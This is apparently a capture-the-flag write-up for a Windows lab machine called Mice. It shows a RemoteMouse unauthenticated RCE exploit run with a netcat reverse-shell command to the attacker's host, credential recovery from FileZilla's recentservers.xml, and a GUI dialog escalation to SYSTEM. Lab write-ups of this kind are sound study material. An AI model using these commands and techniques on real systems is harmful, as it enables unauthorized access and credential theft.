#Windows #RemoteMouse #RCE #FileZilla #CredentialHunting #GUI-LPE

## Overview

Mice is a short Windows machine with two interesting twists. The foothold comes from RemoteMouse, a legitimate remote-control app left exposed with a known unauthenticated RCE vulnerability. After landing a shell, credentials for a real user are recovered from a FileZilla saved-servers XML file, and those credentials work over RDP. Privilege escalation then circles back to RemoteMouse itself: a different CVE in the GUI lets a standard user pop a SYSTEM command prompt by abusing the "Image Transfer Folder" dialog, which spawns Explorer with administrator privilege.

## Recon

### Nmap

```sh
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
7680/tcp open  pando-pub?
```

Ports 1978-1980 are the RemoteMouse application's listener ports. RDP on 3389 suggests a real interactive user session is expected. The RemoteMouse signature is the immediate target, it's a well-known vulnerable service.

## Foothold

### RemoteMouse Unauthenticated RCE

RemoteMouse is a tool that lets a phone or tablet control a Windows desktop. Versions up to 3.008 accept unauthenticated commands over the network. The ExploitDB PoC did not work on this target, but the GitHub exploit by p0dalirius did:

```sh
python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.114.199 \
  -c 'C:\Windows\temp\nc.exe 192.168.45.172 443 -e cmd'
```

> **How the RemoteMouse RCE works:** the RemoteMouse server receives mouse movement and keyboard commands from its companion mobile app over a simple TCP protocol with no authentication. The exploit sends a crafted "keyboard shortcut" command that causes the server to execute an arbitrary shell command as the logged-in user. No credentials needed, the attack surface is designed for convenience, not security.

```sh
sudo rlwrap nc -lvnp 443
connect to [192.168.45.172]

C:\Windows\temp>whoami
mice\divine
```

### Credential Recovery from FileZilla

WinPEAS did not surface obvious escalation paths, so manual enumeration focused on installed applications. FileZilla was present, and FileZilla stores recent server connections, including saved passwords, in plaintext XML:

```
C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml
```

```xml
<Server>
    <Host>ftp.pg</Host>
    <User>divine</User>
    <Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
    <Logontype>1</Logontype>
</Server>
```

> **Why FileZilla stores cleartext-equivalent passwords:** FileZilla encodes saved passwords in Base64 with no encryption, which is equivalent to storing them plaintext. Any user who can read the AppData path, or any attacker who gains code execution as that user, can recover all saved FTP credentials instantly. The file's location is well-documented and a standard post-exploitation target.

Decoding the password:

```sh
echo "Q29udHJvbEZyZWFrMTE=" | base64 -d
‹redacted›
```

Credentials:

```
divine : ‹redacted›
```

These worked over RDP:

```sh
xfreerdp /u:"divine" /p:"‹redacted›" /v:192.168.114.199
```

## Privilege Escalation

### RemoteMouse GUI, Image Transfer Folder LPE (ExploitDB 50047)

The same RemoteMouse app has a separate local privilege escalation: the "Image Transfer Folder" setting in the GUI spawns an Explorer "Save As" dialog with elevated token. By typing a path directly into the dialog's address bar, a user can open any executable, including `cmd.exe`, with administrator privileges.

Steps from ExploitDB 50047:

1. Open Remote Mouse from the system tray
2. Go to Settings
3. Click Change in the "Image Transfer Folder" section
4. When the Save As prompt appears, enter `C:\Windows\System32\cmd.exe` in the address bar

> **Why the dialog inherits elevated privilege:** some GUI components that run embedded in a privileged process (like the RemoteMouse tray service) pass their file-picker dialogs a handle that inherits the calling process's token. When the dialog allows executing a typed path, it does so under the elevated context, effectively letting a standard user chain "open dialog" into "run as admin."

A command prompt spawned with SYSTEM-level access.

## Root / SYSTEM

```
C:\Windows\System32>whoami
nt authority\system
```

## Takeaways

- **Convenience tools are attack surface.** RemoteMouse runs as a network service with no authentication, by design. Any tool that lets a phone control a computer is one network packet away from RCE.
- **FileZilla `recentservers.xml` is a credential store in disguise.** Base64 is not encryption. Check `AppData\Roaming\FileZilla\` on every Windows machine you compromise.
- **GUI-based LPEs are real.** The RemoteMouse dialog trick looks trivial on paper but produces a SYSTEM shell. Privileged tray apps that spawn file pickers are worth investigating, they sometimes inherit tokens that let standard users escape their privilege boundary.
